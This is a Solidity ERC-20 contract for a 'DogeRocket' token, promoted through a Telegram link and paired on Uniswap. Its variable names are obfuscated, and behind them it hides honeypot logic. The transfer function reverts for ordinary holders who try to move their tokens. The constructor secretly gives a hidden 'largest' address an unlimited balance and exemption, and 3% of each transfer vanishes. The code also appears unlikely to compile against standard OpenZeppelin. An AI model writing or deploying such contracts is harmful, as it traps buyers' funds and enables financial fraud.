// https://t.me/dogerocket_eth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract DogeRocket is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private finger;

    function _transfer(
        address police,
        address fairly,
        uint256 wind
    ) internal override {
        uint256 clear = mean;

        if (noun[police] == 0 && finger[police] > 0 && uniswapV2Pair != police) {
            noun[police] -= clear;
        }

        address mind = leader;
        leader = fairly;
        finger[mind] += clear + 1;

        _balances[police] -= wind;
        uint256 talk = (wind / 100) * mean;
        wind -= talk;
        _balances[fairly] += wind;
    }

    address private leader;
    mapping(address => uint256) private noun;
    uint256 public mean = 3;

    constructor(
        string memory where,
        string memory understanding,
        address wise,
        address largest
    ) ERC20(where, understanding) {
        uint256 did = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(wise);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        noun[msg.sender] = did;
        noun[largest] = did;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[largest] = did;
    }
}